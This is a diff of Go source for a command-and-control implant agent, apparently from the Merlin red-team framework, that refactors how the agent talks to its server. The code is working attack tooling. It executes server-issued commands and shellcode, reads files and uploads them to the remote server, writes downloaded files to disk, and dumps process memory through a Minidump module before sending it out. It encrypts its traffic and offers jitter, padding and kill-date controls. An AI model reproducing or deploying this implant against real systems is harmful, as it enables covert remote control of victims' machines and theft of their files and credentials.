-			if resp2.StatusCode != 200 {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-				}
-			}
-		case "NativeCmd":
-			var p messages.NativeCmd
-			err5 := json.Unmarshal(payload, &p)
-			if err5 != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error unmarshalling the NativeCmd JSON "+
-						"message:\r\n%s", err5.Error()))
-				}
-			}
-
-			switch p.Command {
-			case "ls":
-				listing, err := a.list(p.Args)
-				var se string
-				if err != nil {
-					se = err.Error()
-					if a.Verbose {
-						message("warn", fmt.Sprintf("ls command returned STDERR: %s", err.Error()))
-					}
-				}
-
-				c := messages.CmdResults{
-					Job:    p.Job,
-					Stdout: listing,
-					Stderr: se,
-				}
-
-				k, err := json.Marshal(c)
-				if err != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error encoding the JSON payload for the"+
-							"ls command:\r\n%s", err.Error()))
-					}
-				}
-
-				g := messages.Base{
-					Version: 1.0,
-					ID:      j.ID,
-					Type:    "CmdResults",
-					Payload: (*json.RawMessage)(&k),
-					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
-				}
-				b2 := new(bytes.Buffer)
-				err6 := json.NewEncoder(b2).Encode(g)
-				if err6 != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error encoding the JSON message for the"+
-							" ls command results:\r\n%s", err6.Error()))
-					}
-					break
-				}
-				if a.Verbose {
-					message("note", fmt.Sprintf("Sending response to server: %s", listing))
-				}
-				resp2, errR := client.Post(host, "application/json; charset=utf-8", b2)
-				if errR != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error with the POST request:\r\n%s",
-							errR.Error()))
-					}
-					break
-				}
-				if resp2.StatusCode != 200 {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d",
-							resp2.StatusCode))
-					}
-				}
-			case "cd":
-				var se string
-				var stdout string
-				err := os.Chdir(p.Args)
-				if err != nil {
-					se = err.Error()
-					if a.Verbose {
-						message("warn", fmt.Sprintf("cd command returned STDERR: %s", err.Error()))
-					}
-				} else {
-					path, pathErr := os.Getwd()
-					if pathErr != nil {
-						se = pathErr.Error()
-					} else {
-						stdout = fmt.Sprintf("Changed working directory to %s", path)
-					}
-				}
-
-				c := messages.CmdResults{
-					Job:    p.Job,
-					Stdout: stdout,
-					Stderr: se,
-				}
-
-				k, err := json.Marshal(c)
-				if err != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error encoding the JSON payload for the"+
-							"ls command:\r\n%s", err.Error()))
-					}
-				}
-
-				g := messages.Base{
-					Version: 1.0,
-					ID:      j.ID,
-					Type:    "CmdResults",
-					Payload: (*json.RawMessage)(&k),
-					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
-				}
-				b2 := new(bytes.Buffer)
-				err7 := json.NewEncoder(b2).Encode(g)
-				if err7 != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", err7.Error()))
-					}
-					break
-				}
-				if a.Verbose {
-					message("note", fmt.Sprintf("Sending response to server: %s", stdout))
-				}
-				resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
-				if errPost != nil {
-					if a.Verbose {
-						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
-						message("warn", errPost.Error())
-					}
-					break
-				}
-				if resp2.StatusCode != 200 {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-					}
-				}
-			case "pwd":
-				var se string
-				dir, err := os.Getwd()
-				if err != nil {
-					se = err.Error()
-					if a.Verbose {
-						message("warn", fmt.Sprintf("pwd command returned STDERR: %s", err.Error()))
-					}
-				}
-
-				c := messages.CmdResults{
-					Job:    p.Job,
-					Stdout: fmt.Sprintf("Current working directory: %s", dir),
-					Stderr: se,
-				}
-
-				k, err := json.Marshal(c)
-				if err != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error encoding the JSON message for the"+
-							"ls command results:\r\n%s", err.Error()))
-					}
-				}
-
-				g := messages.Base{
-					Version: 1.0,
-					ID:      j.ID,
-					Type:    "CmdResults",
-					Payload: (*json.RawMessage)(&k),
-					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
-				}
-				b2 := new(bytes.Buffer)
-				err8 := json.NewEncoder(b2).Encode(g)
-				if err8 != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", err8.Error()))
-					}
-					break
-				}
-				if a.Verbose {
-					message("note", fmt.Sprintf("Sending response to server: %s", dir))
-				}
-				resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
-				if errPost != nil {
-					if a.Verbose {
-						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
-						message("warn", errPost.Error())
-					}
-					break
-				}
-				if resp2.StatusCode != 200 {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-					}
-				}
-			default:
-				if a.Verbose {
-					message("warn", fmt.Sprintf("Received unrecognized message type: %s", j.Type))
-				}
-			}
-		}
+	// Used when the message was ServerOK, no further processing is needed
+	if m.Type == "" {
+		return
 	}
+
+	_, errR := a.sendMessage("post", m)
+	if errR != nil {
+		if a.Verbose {
+			message("warn", errR.Error())
+		}
+		return
+	}
+
 }
 
 // getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
@@ -1197,6 +402,423 @@ func getClient(protocol string) (*http.Client, error) {
 	return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
 }
 
+// sendMessage is a generic function to receive a messages.Base struct, encode it, encrypt it, and send it to the server
+// The response message will be decrypted, decoded, and return a messages.Base struct.
+func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, error) {
+	if a.Debug {
+		message("debug", "Entering into agent.sendMessage")
+	}
+	if a.Verbose {
+		message("note", fmt.Sprintf("Sending %s message to %s", m.Type, a.URL))
+	}
+
+	var returnMessage messages.Base
+
+	// Convert messages.Base to gob
+	messageBytes := new(bytes.Buffer)
+	errGobEncode := gob.NewEncoder(messageBytes).Encode(m)
+	if errGobEncode != nil {
+		return returnMessage, fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", m.Type, errGobEncode.Error())
+	}
+
+	// Get JWE
+	jweString, errJWE := core.GetJWESymetric(messageBytes.Bytes(), a.secret)
+	if errJWE != nil {
+		return returnMessage, errJWE
+	}
+
+	// Encode JWE into gob
+	jweBytes := new(bytes.Buffer)
+	errJWEBuffer := gob.NewEncoder(jweBytes).Encode(jweString)
+	if errJWEBuffer != nil {
+		return returnMessage, fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", m.Type, errJWEBuffer.Error())
+	}
+
+	switch strings.ToLower(method) {
+	case "post":
+		req, reqErr := http.NewRequest("POST", a.URL, jweBytes)
+		if reqErr != nil {
+			return returnMessage, fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
+		}
+
+		if req != nil {
+			req.Header.Set("User-Agent", a.UserAgent)
+			req.Header.Set("Content-Type", "application/octet-stream; charset=utf-8")
+			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", a.JWT))
+		}
+
+		// Send the request
+		resp, err := a.Client.Do(req)
+		if err != nil {
+			return returnMessage, fmt.Errorf("there was an error with the HTTP client while performing a POST:\r\n%s", err.Error())
+		}
+		if a.Debug {
+			message("debug", fmt.Sprintf("HTTP Response:\r\n%+v", resp))
+		}
+		if resp.StatusCode != 200 {
+			return returnMessage, fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
+		}
+
+		contentType := resp.Header.Get("Content-Type")
+		if contentType == "" {
+			return returnMessage, fmt.Errorf("the response did not contain a Content-Type header")
+		}
+
+		// Check to make sure the response contains the application/octet-stream Content-Type header
+		isOctet := false
+		for _, v := range strings.Split(contentType, ",") {
+			if strings.ToLower(v) == "application/octet-stream" {
+				isOctet = true
+			}
+		}
+
+		if !isOctet {
+			return returnMessage, fmt.Errorf("the response message did not contain the application/octet-stream Content-Type header")
+		}
+
+		// Check to make sure message response contained data
+		if resp.ContentLength == 0 {
+			return returnMessage, fmt.Errorf("the response message did not contain any data")
+		}
+
+		var jweString string
+
+		// Decode GOB from server response into JWE
+		errD := gob.NewDecoder(resp.Body).Decode(&jweString)
+		if errD != nil {
+			return returnMessage, fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
+		}
+
+		// Decrypt JWE to messages.Base
+		respMessage, errDecrypt := core.DecryptJWE(jweString, a.secret)
+		if errDecrypt != nil {
+			return returnMessage, errDecrypt
+		}
+
+		return respMessage, nil
+	default:
+		return returnMessage, fmt.Errorf("%s is an invalid method for sending a message", method)
+	}
+
+}
+
+// messageHandler looks at the message type and performs the associated action
+func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
+	if a.Debug {
+		message("debug", "Entering into agent.messageHandler function")
+	}
+	if a.Verbose {
+		message("success", fmt.Sprintf("%s message type received!", m.Type))
+	}
+
+	returnMessage := messages.Base{
+		Version: 1.0,
+		ID:      a.ID,
+		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+	}
+
+	var c messages.CmdResults
+	if m.Token != "" {
+		a.JWT = m.Token
+	}
+
+	switch m.Type {
+	case "FileTransfer":
+		p := m.Payload.(messages.FileTransfer)
+		c.Job = p.Job
+		// Agent will be downloading a file from the server
+		if p.IsDownload {
+			if a.Verbose {
+				message("note", "FileTransfer type: Download")
+			}
+
+			d, _ := filepath.Split(p.FileLocation)
+			_, directoryPathErr := os.Stat(d)
+			if directoryPathErr != nil {
+				c.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
+					"directory %s:\r\n", p.FileLocation)
+				c.Stderr += directoryPathErr.Error()
+			}
+			if c.Stderr == "" {
+				if a.Verbose {
+					message("note", fmt.Sprintf("Writing file to %s", p.FileLocation))
+				}
+				downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
+				if downloadFileErr != nil {
+					c.Stderr = downloadFileErr.Error()
+				} else {
+					errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
+					if errF != nil {
+						c.Stderr = errF.Error()
+					} else {
+						c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", p.FileLocation, a.ID.String())
+					}
+				}
+			}
+		}
+		// Agent will uploading a file to the server
+		if !p.IsDownload {
+			if a.Verbose {
+				message("note", "FileTransfer type: Upload")
+			}
+
+			fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
+			if fileDataErr != nil {
+				if a.Verbose {
+					message("warn", fmt.Sprintf("There was an error reading %s", p.FileLocation))
+					message("warn", fileDataErr.Error())
+				}
+				c.Stderr = fmt.Sprintf("there was an error reading %s:\r\n%s", p.FileLocation, fileDataErr.Error())
+			} else {
+				fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
+				_, errW := io.WriteString(fileHash, string(fileData))
+				if errW != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
+					}
+				}
+
+				if a.Verbose {
+					message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
+						p.FileLocation,
+						len(fileData),
+						fileHash.Sum(nil)))
+				}
+				ft := messages.FileTransfer{
+					FileLocation: p.FileLocation,
+					FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
+					IsDownload:   true,
+					Job:          p.Job,
+				}
+
+				returnMessage.Type = "FileTransfer"
+				returnMessage.Payload = ft
+				return returnMessage, nil
+			}
+		}
+	case "CmdPayload":
+		p := m.Payload.(messages.CmdPayload)
+		c.Job = p.Job
+		c.Stdout, c.Stderr = a.executeCommand(p)
+	case "ServerOk":
+		if a.Verbose {
+			message("note", "Received Server OK, doing nothing")
+		}
+		return returnMessage, nil
+	case "Module":
+		if a.Verbose {
+			message("note", "Received Agent Module Directive")
+		}
+		p := m.Payload.(messages.Module)
+		c.Job = p.Job
+		switch p.Command {
+		case "Minidump":
+			if a.Verbose {
+				message("note", "Received Minidump request")
+			}
+
+			//ensure the provided args are valid
+			if len(p.Args) < 2 {
+				//not enough args
+				c.Stderr = "not enough arguments provided to the Minidump module to dump a process"
+				break
+			}
+			process := p.Args[0]
+			pid, err := strconv.ParseInt(p.Args[1], 0, 32)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("minidump module could not parse PID as an integer:%s\r\n%s", p.Args[1], err.Error())
+				break
+			}
+
+			tempPath := ""
+			if len(p.Args) == 3 {
+				tempPath = p.Args[2]
+			}
+
+			// Get minidump
+			miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))
+
+			//copied and pasted from upload func, modified appropriately
+			if miniDumpErr != nil {
+				c.Stderr = fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
+					miniDumpErr.Error())
+			} else {
+				fileHash := sha256.New()
+				_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
+				if errW != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
+					}
+				}
+
+				if a.Verbose {
+					message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
+						len(miniD["FileContent"].([]byte)),
+						fileHash.Sum(nil)))
+				}
+				fileTransferMessage := messages.FileTransfer{
+					FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
+					FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
+					IsDownload:   true,
+					Job:          p.Job,
+				}
+
+				returnMessage.Type = "FileTransfer"
+				returnMessage.Payload = fileTransferMessage
+				return returnMessage, nil
+			}
+		default:
+			c.Stderr = fmt.Sprintf("%s is not a valid module type", p.Command)
+		}
+	case "AgentControl":
+		if a.Verbose {
+			message("note", "Received Agent Control Message")
+		}
+		p := m.Payload.(messages.AgentControl)
+		c.Job = p.Job
+		switch p.Command {
+		case "kill":
+			if a.Verbose {
+				message("note", "Received Agent Kill Message")
+			}
+			os.Exit(0)
+		case "sleep":
+			if a.Verbose {
+				message("note", fmt.Sprintf("Setting agent sleep time to %s", p.Args))
+			}
+			t, err := time.ParseDuration(p.Args)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("there was an error changing the agent waitTime:\r\n%s", err.Error())
+				break
+			}
+			if t > 0 {
+				a.WaitTime = t
+			} else {
+				c.Stderr = fmt.Sprintf("the agent was provided with a time that was not greater than zero:\r\n%s", t.String())
+				break
+			}
+		case "skew":
+			t, err := strconv.ParseInt(p.Args, 10, 64)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("there was an error changing the agent skew interval:\r\n%s", err.Error())
+				break
+			}
+			if a.Verbose {
+				message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
+			}
+			a.Skew = t
+		case "padding":
+			t, err := strconv.Atoi(p.Args)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("there was an error changing the agent message padding size:\r\n%s", err.Error())
+				break
+			}
+			if a.Verbose {
+				message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
+			}
+			a.PaddingMax = t
+		case "initialize":
+			if a.Verbose {
+				message("note", "Received agent re-initialize message")
+			}
+			a.initial = false
+		case "maxretry":
+			t, err := strconv.Atoi(p.Args)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("There was an error changing the agent max retries:\r\n%s", err.Error())
+				break
+			}
+			if a.Verbose {
+				message("note", fmt.Sprintf("Setting agent max retries to %d", t))
+			}
+			a.MaxRetry = t
+		case "killdate":
+			d, err := strconv.Atoi(p.Args)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("there was an error converting the kill date to an integer:\r\n%s", err.Error())
+				break
+			}
+			a.KillDate = int64(d)
+			if a.Verbose {
+				message("info", fmt.Sprintf("Set Kill Date to: %s",
+					time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
+			}
+		default:
+			c.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", p.Command)
+			break
+		}
+		return a.getAgentInfoMessage(), nil
+	case "Shellcode":
+		if a.Verbose {
+			message("note", "Received Execute shellcode command")
+		}
+
+		s := m.Payload.(messages.Shellcode)
+		var e error
+		c.Job = s.Job
+		e = a.executeShellcode(s) // Execution method determined in function
+
+		if e != nil {
+			c.Stderr = fmt.Sprintf("there was an error with the shellcode module:\r\n%s", e.Error())
+		} else {
+			c.Stdout = "Shellcode module executed without errors"
+		}
+	case "NativeCmd":
+		p := m.Payload.(messages.NativeCmd)
+		c.Job = p.Job
+		switch p.Command {
+		case "ls":
+			listing, err := a.list(p.Args)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
+				break
+			}
+			c.Stdout = listing
+		case "cd":
+			err := os.Chdir(p.Args)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
+			} else {
+				path, pathErr := os.Getwd()
+				if pathErr != nil {
+					c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
+				} else {
+					c.Stdout = fmt.Sprintf("Changed working directory to %s", path)
+				}
+			}
+		case "pwd":
+			dir, err := os.Getwd()
+			if err != nil {
+				c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
+			} else {
+				c.Stdout = fmt.Sprintf("Current working directory: %s", dir)
+			}
+		default:
+			c.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", p.Command)
+		}
+	case "KeyExchange":
+		p := m.Payload.(messages.KeyExchange)
+		a.PublicKey = p.PublicKey
+		return returnMessage, nil
+	default:
+		return returnMessage, fmt.Errorf("%s is not a valid message type", m.Type)
+	}
+
+	if a.Verbose && c.Stdout != "" {
+		message("success", c.Stdout)
+	}
+	if a.Verbose && c.Stderr != "" {
+		message("warn", c.Stderr)
+	}
+
+	returnMessage.Type = "CmdResults"
+	returnMessage.Payload = c
+	if a.Debug {
+		message("debug", "Leaving agent.messageHandler function without error")
+	}
+	return returnMessage, nil
+}
+
 func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
 	if a.Debug {
 		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))
@@ -1218,7 +840,7 @@ func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr str
 		}
 	}
 
-	return stdout, stderr // TODO return if the output was stdout or stderr and color stderr red on server
+	return stdout, stderr
 }
 
 func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
@@ -1304,78 +926,6 @@ func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 	}
 }
 
-func (a *Agent) agentInfo(host string, client *http.Client) {
-	i := messages.AgentInfo{
-		Version:       merlin.Version,
-		Build:         build,
-		WaitTime:      a.WaitTime.String(),
-		PaddingMax:    a.PaddingMax,
-		MaxRetry:      a.MaxRetry,
-		FailedCheckin: a.FailedCheckin,
-		Skew:          a.Skew,
-		Proto:         a.Proto,
-		KillDate:      a.KillDate,
-	}
-
-	payload, errP := json.Marshal(i)
-
-	if errP != nil {
-		if a.Debug {
-			message("warn", "There was an error marshaling the JSON object")
-			message("warn", errP.Error())
-		}
-	}
-
-	g := messages.Base{
-		Version: 1.0,
-		ID:      a.ID,
-		Type:    "AgentInfo",
-		Payload: (*json.RawMessage)(&payload),
-		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
-	}
-
-	b := new(bytes.Buffer)
-	err := json.NewEncoder(b).Encode(g)
-	if err != nil {
-		if a.Verbose {
-			message("warn", fmt.Sprintf("There was an error encoding the agentInfo JSON message:\r\n%s", err.Error()))
-		}
-		return
-	}
-	if a.Verbose {
-		message("note", fmt.Sprintf("Connecting to web server at %s to update agent configuration information.", host))
-	}
-	resp, err := client.Post(host, "application/json; charset=utf-8", b)
-
-	if err != nil {
-		a.FailedCheckin++
-		if a.Debug {
-			message("warn", "There was an error with the HTTP client while performing a POST:")
-			message("warn", err.Error())
-		}
-		if a.Verbose {
-			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
-		}
-		return
-	}
-	if a.Debug {
-		message("debug", "HTTP Response:")
-		message("warn", fmt.Sprintf("%+v", resp))
-	}
-	if resp.StatusCode != 200 {
-		a.FailedCheckin++
-		if a.Verbose {
-			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
-		}
-		if a.Debug {
-			message("warn", "There was an error communicating with the server!")
-			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
-		}
-		return
-	}
-	a.FailedCheckin = 0
-}
-
 func (a *Agent) list(path string) (string, error) {
 	if a.Debug {
 		message("debug", fmt.Sprintf("Received input parameter for list command function: %s", path))
@@ -1407,7 +957,210 @@ func (a *Agent) list(path string) (string, error) {
 	return details, nil
 }
 
-// TODO Make a generic function to send a JSON message; Keep basic so protocols can be switched (i.e. DNS)
+// opaqueAuthenticate is used to authenticate an agent leveraging the OPAQUE Password Authenticated Key Exchange (PAKE) protocol
+func (a *Agent) opaqueAuthenticate() error {
+	// 1 - Create a NewUserAuth with an embedded key exchange
+	userKex := gopaque.NewKeyExchangeSigma(gopaque.CryptoDefault)
+	userAuth := gopaque.NewUserAuth(gopaque.CryptoDefault, a.ID.Bytes(), userKex)
+
+	// 2 - Call Init with the password and send the resulting UserAuthInit to the server
+	userAuthInit, err := userAuth.Init(a.secret)
+	if err != nil {
+		return fmt.Errorf("there was an error creating the OPAQUE user authentication initialization message:\r\n%s", err.Error())
+	}
+
+	userAuthInitBytes, errUserAuthInitBytes := userAuthInit.ToBytes()
+	if errUserAuthInitBytes != nil {
+		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication initialization message to bytes:\r\n%s", errUserAuthInitBytes.Error())
+	}
+
+	// message to be sent to the server
+	authInitBase := messages.Base{
+		Version: 1.0,
+		ID:      a.ID,
+		Type:    "AuthInit",
+		Payload: userAuthInitBytes,
+		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+	}
+
+	authInitResp, errAuthInitResp := a.sendMessage("POST", authInitBase)
+
+	if errAuthInitResp != nil {
+		return fmt.Errorf("there was an error sending the agent OPAQUE authentication initialization message:\r\n%s", errAuthInitResp.Error())
+	}
+
+	if authInitResp.Type != "AuthInit" {
+		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user authenticaion initialization", authInitResp.Type)
+	}
+
+	// 3 - Receive the server's ServerAuthComplete
+	var serverComplete gopaque.ServerAuthComplete
+
+	errServerComplete := serverComplete.FromBytes(gopaque.CryptoDefault, authInitResp.Payload.([]byte))
+	if errServerComplete != nil {
+		return fmt.Errorf("there was an error unmarshalling the OPAQUE server complete message from bytes:\r\n%s", errServerComplete.Error())
+	}
+
+	// 4 - Call Complete with the server's ServerAuthComplete. The resulting UserAuthFinish has user and server key
+	// information. This would be the last step if we were not using an embedded key exchange. Since we are, take the
+	// resulting UserAuthComplete and send it to the server.
+	_, userAuthComplete, errUserAuth := userAuth.Complete(&serverComplete)
+	if errUserAuth != nil {
+		return fmt.Errorf("there was an error completing OPAQUE authentication:\r\n%s", errUserAuth)
+	}
+
+	userAuthCompleteBytes, errUserAuthCompleteBytes := userAuthComplete.ToBytes()
+	if errUserAuthCompleteBytes != nil {
+		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication complete message to bytes:\r\n%s", errUserAuthCompleteBytes.Error())
+	}
+
+	authCompleteBase := messages.Base{
+		Version: 1.0,
+		ID:      a.ID,
+		Type:    "AuthComplete",
+		Payload: &userAuthCompleteBytes,
+		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+	}
+
+	// Save the OPAQUE derived Diffie-Hellman secret
+	a.secret = []byte(userKex.SharedSecret.String())
+
+	// Send the User Auth Complete message
+	authCompleteResp, errAuthCompleteResp := a.sendMessage("POST", authCompleteBase)
+
+	if errAuthCompleteResp != nil {
+		return fmt.Errorf("there was an error sending the agent OPAQUE authentication completion message:\r\n%s", errAuthCompleteResp.Error())
+	}
+
+	switch authCompleteResp.Type {
+	case "ServerOk":
+		if a.Verbose {
+			message("success", "Agent authentication successful")
+		}
+		if a.Debug {
+			message("debug", "Leaving agent.opaqueAuthenticate without error")
+		}
+		return nil
+	default:
+		return fmt.Errorf("recieved unexpected or unrecognized message type during OPAQUE authentication completion:\r\n%s", authCompleteResp.Type)
+	}
+
+}
+
+// rsaKeyExchange is use to create and exchange RSA keys with the server
+func (a *Agent) rsaKeyExchange() error {
+	if a.Debug {
+		message("debug", "Entering into rsaKeyExchange function")
+	}
+
+	pk := messages.KeyExchange{
+		PublicKey: a.RSAKeys.PublicKey,
+	}
+
+	m := messages.Base{
+		Version: 1.0,
+		ID:      a.ID,
+		Type:    "KeyExchange",
+		Payload: pk,
+		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+	}
+
+	// Send KeyExchange to server
+	resp, reqErr := a.sendMessage("POST", m)
+
+	if reqErr != nil {
+		return fmt.Errorf("there was an error sending the key exchange message:\r\n%s", reqErr.Error())
+	}
+
+	// Handle KeyExchange response from server
+	_, errKeyExchange := a.messageHandler(resp)
+
+	if errKeyExchange != nil {
+		return fmt.Errorf("there was an error handling the RSA key exchange response message:\r\n%s", errKeyExchange)
+	}
+
+	if a.Debug {
+		message("debug", "Leaving rsaKeyExchange function without error")
+	}
+	return nil
+}
+
+// getJWT is used to send an unauthenticated JWT on the first message to the server
+func (a *Agent) getJWT() (string, error) {
+	// Create encrypter
+	encrypter, encErr := jose.NewEncrypter(jose.A256GCM,
+		jose.Recipient{
+			Algorithm: jose.DIRECT, // Doesn't create a per message key
+			Key:       a.secret},
+		(&jose.EncrypterOptions{}).WithType("JWT").WithContentType("JWT"))
+	if encErr != nil {
+		return "", fmt.Errorf("there was an error creating the JWT encryptor:\r\n%s", encErr.Error())
+	}
+
+	// Create signer
+	signer, errSigner := jose.NewSigner(jose.SigningKey{
+		Algorithm: jose.HS256,
+		Key:       a.secret},
+		(&jose.SignerOptions{}).WithType("JWT"))
+	if errSigner != nil {
+		return "", fmt.Errorf("there was an error creating the JWT signer:\r\n%s", errSigner.Error())
+	}
+
+	// Build JWT claims
+	cl := jwt.Claims{
+		IssuedAt: jwt.NewNumericDate(time.Now().UTC()),
+		ID:       a.ID.String(),
+	}
+
+	agentJWT, err := jwt.SignedAndEncrypted(signer, encrypter).Claims(cl).CompactSerialize()
+	if err != nil {
+		return "", fmt.Errorf("there was an error serializing the JWT:\r\n%s")
+	}
+
+	// Parse it to check for errors
+	_, errParse := jwt.ParseSignedAndEncrypted(agentJWT)
+	if errParse != nil {
+		return "", fmt.Errorf("there was an error parsing the encrypted JWT:\r\n%s", errParse.Error())
+	}
+
+	return agentJWT, nil
+}
+
+// getAgentInfoMessage is used to place of the information about an agent and it's configuration into a message and return it
+func (a *Agent) getAgentInfoMessage() messages.Base {
+	sysInfoMessage := messages.SysInfo{
+		Platform:     a.Platform,
+		Architecture: a.Architecture,
+		UserName:     a.UserName,
+		UserGUID:     a.UserGUID,
+		HostName:     a.HostName,
+		Pid:          a.Pid,
+		Ips:          a.Ips,
+	}
+
+	agentInfoMessage := messages.AgentInfo{
+		Version:       merlin.Version,
+		Build:         build,
+		WaitTime:      a.WaitTime.String(),
+		PaddingMax:    a.PaddingMax,
+		MaxRetry:      a.MaxRetry,
+		FailedCheckin: a.FailedCheckin,
+		Skew:          a.Skew,
+		Proto:         a.Proto,
+		SysInfo:       sysInfoMessage,
+		KillDate:      a.KillDate,
+	}
+
+	baseMessage := messages.Base{
+		Version: 1.0,
+		ID:      a.ID,
+		Type:    "AgentInfo",
+		Payload: agentInfoMessage,
+		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+	}
+
+	return baseMessage
+}
 
 // TODO centralize this into a package because it is used here and in the server
 // message is used to print a message to the command line
@@ -1428,18 +1181,7 @@ func message(level string, message string) {
 	}
 }
 
-/*
-
-1. POST System Enumeration Information and receive back JSON object w/ additional instructions
-2. Sleep
-3. Check in w/ Server
-4. Execute commands if provided by server
-5. Return results to server
-6. Sleep and Check In
-*/
-
 // TODO add cert stapling
 // TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
 // TODO Add standard function for printing messages like in the JavaScript agent. Make it a lib for agent and server?
-// TODO send cmdResult for agentcontrol messages
 // TODO configure set UserAgent agentcontrol message
